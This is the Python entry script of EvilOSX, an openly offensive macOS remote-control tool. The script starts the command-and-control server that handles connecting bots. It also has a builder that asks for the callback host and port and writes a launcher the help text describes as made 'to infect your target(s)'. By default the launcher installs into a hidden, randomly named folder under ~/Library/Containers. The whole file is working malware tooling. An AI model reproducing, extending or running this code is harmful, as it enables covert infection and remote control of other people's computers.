#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Starts the server."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from argparse import ArgumentParser
from os import path
from sys import exit
from uuid import uuid4

from bot import launchers, loaders
from server.handler import start_server
from server.model import Model
from server.version import VERSION

BANNER = """\
▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▒▒ █ █ ▒░
▒███   ▓██  █▒░▒██▒▒██░    ▒██░  ██▒░ ▓██▄   ░░  █   ░
▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒   @{} (v{})
░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  GPLv3 licensed
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░░░   ░▒ ░
   ░       ░░   ▒ ░  ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░    ░  
   ░  ░     ░   ░      ░  ░    ░ ░        ░   ░    ░  
""".format(__author__, VERSION)

MESSAGE_INPUT = "[\033[1m?\033[0m] "
MESSAGE_INFO = "[\033[94mI\033[0m] "
MESSAGE_ATTENTION = "[\033[91m!\033[0m] "

try:
    # Python2 support.
    # noinspection PyShadowingBuiltins
    input = raw_input
except NameError:
    pass


def builder():
    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ")
    server_port = int(input(MESSAGE_INPUT + "Server port: "))
    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? "
                                              "(Leave empty for ~/Library/Containers/.<RANDOM>): ")

    if not program_directory:
        program_directory = "~/Library/Containers/.{}".format(launchers.get_random_string())
    
    # Select a launcher
    launcher_names = launchers.get_names()

    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
    for i, launcher_name in enumerate(launcher_names):
        print("{} = {}".format(str(i), launcher_name))

    while True:
        try:
            selected_launcher = input(MESSAGE_INPUT + "Launcher to use (Leave empty for 1): ")

            if not selected_launcher:
                selected_launcher = 1
            else:
                selected_launcher = int(selected_launcher)

            selected_launcher = launcher_names[selected_launcher]
            break
        except (ValueError, IndexError):
            continue

    # Select a loader
    loader_names = loaders.get_names()

    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
    for i, loader_name in enumerate(loader_names):
        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))

    while True:
        try:
            selected_loader = input(MESSAGE_INPUT + "Loader to use (Leave empty for 0): ")

            if not selected_loader:
                selected_loader = 0
            else:
                selected_loader = int(selected_loader)

            selected_loader = loader_names[selected_loader]
            break
        except (ValueError, IndexError):
            continue

    set_options = []

    for option_message in loaders.get_option_messages(selected_loader):
        set_options.append(input(MESSAGE_INPUT + option_message))

    # Loader setup
    loader_options = loaders.get_options(selected_loader, set_options)
    loader_options["program_directory"] = program_directory

    # Create the launcher
    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
    stager = launchers.create_stager(server_host, server_port, loader_options)

    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
        str(uuid4())[:6], launcher_extension
    )))

    with open(launcher_path, "w") as output_file:
        output_file.write(launcher)

    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))


def main():
    parser = ArgumentParser()
    parser.add_argument("-p", "--port", help="server port to listen on", type=int)
    parser.add_argument("--cli", help="show the command line interface", action="store_true")
    parser.add_argument("--builder", help="build a launcher to infect your target(s)", action="store_true")
    parser.add_argument("--no-banner", help="prevents the EvilOSX banner from being displayed", action="store_true")

    arguments = parser.parse_args()

    if not arguments.no_banner:
        try:
            print(BANNER)
        except UnicodeEncodeError:
            # Thrown on my Raspberry PI (via SSH).
            print(MESSAGE_ATTENTION + "Failed to print fancy banner, skipping...")

    if arguments.builder:
        # Run the builder then exit.
        builder()
        exit(0)

    if arguments.port:
        server_port = arguments.port
    else:
        while True:
            try:
                server_port = int(input(MESSAGE_INPUT + "Server port to listen on: "))
                break
            except ValueError:
                print(MESSAGE_ATTENTION + "Invalid port.")
                continue

    model = Model()
    if arguments.cli:
        from server.view.cli import ViewCLI
        view = ViewCLI(model, server_port)
    else:
        from server.view.gui import ViewGUI
        view = ViewGUI(model, server_port)

    # Start handling bot requests
    start_server(model, view, server_port)

    # Start the view, blocks until exit.
    view.start()

    print(MESSAGE_INFO + "Feel free to submit any issues or feature requests on GitHub.")
    print(MESSAGE_INFO + "Goodbye!")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
        exit(0)
